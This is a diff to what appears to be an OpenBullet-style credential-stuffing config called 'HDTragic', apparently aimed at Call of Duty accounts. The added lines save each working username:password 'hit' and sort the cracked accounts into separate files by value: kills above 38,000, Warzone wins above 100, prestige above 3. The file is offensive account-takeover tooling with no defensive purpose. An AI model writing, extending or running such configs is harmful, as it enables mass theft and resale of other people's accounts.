@@ -3,7 +3,7 @@
   "Name": "HDTragic",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-12-31T01:24:07.4299819-07:00",
+  "LastModified": "2020-12-31T01:32:29.3365098-07:00",
   "AdditionalInfo": "",
   "Author": "HDTragic",
   "Version": "1.4.1 [Anomaly]",
@@ -231,7 +231,22 @@ FUNCTION Constant "False" -> CAP "Obsidian"
 ENDIF
 IF "<Damascus>" Contains "True"
 
-UTILITY File "Hits\\HDTragic.txt" Write "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+UTILITY File "Hits_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+
+ENDIF
+IF "<Kills>" GreaterThan "38000"
+
+UTILITY File "38K+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+
+ENDIF
+IF "<WZ Wins>" GreaterThan "100"
+
+UTILITY File "WZWins100+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+
+ENDIF
+IF "<Prestige>" GreaterThen "3"
+
+UTILITY File "Prestige4+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
 
 ENDIF
 
